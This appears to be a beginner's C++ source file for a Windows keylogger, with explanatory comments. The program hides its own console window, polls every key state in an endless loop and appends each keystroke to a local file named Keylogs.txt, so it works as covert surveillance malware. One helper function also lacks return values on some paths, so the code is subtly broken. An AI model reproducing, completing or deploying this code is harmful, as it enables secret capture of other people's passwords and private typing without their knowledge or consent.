/*This is where I call my source files that I will need for the program to run*/
#include <Windows.h>
/*Using this to call win32 api functions in order for the program to work*/
#include <fstream>
/*Using this to call char later*/
#include <string>
/*This source file is used when calling std::string which is done in the next line*/

using std::fstream;
using std::ofstream;
/*these perform input and output operations*/

void WriteData(std::string Text) {
    ofstream LogFile;
    LogFile.open("Keylogs.txt", fstream::app);
    LogFile << Text;
    LogFile.close();
}
/*Sets the place where the logging will be printed*/

void Stealth() {
    HWND hWnd;
    AllocConsole();
    hWnd = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(hWnd, 0);
}
/*Hides the program running.*/

bool isKeyListed(int vKey) {
    switch (vKey) {
    case VK_RETURN:
        WriteData("\n");
        break;
    case VK_BACK:
        WriteData("\b");
        break;
    case VK_SPACE:
        WriteData(" ");
        break;
    case VK_SHIFT:
        WriteData(" *shift* ");
        break;
    case VK_OEM_PERIOD:
        WriteData(".");
        break;
    default: return false;
    }
}
/*the VK_ are looking for what is being pressed on the keyboard and returning those values*/

/*Was the program successful?*/
int main() {
    Stealth();
    char Key;
    while (1) {
        for (Key = 8; Key < 127; Key++) {
            if (GetAsyncKeyState(Key) == -32767) {
                if (isKeyListed(Key) == 0) {
                    ofstream LogFile;
                    LogFile.open("Keylogs.txt", fstream::app);
                    LogFile << Key;
                    LogFile.close();
                }
            }
        }
    }
}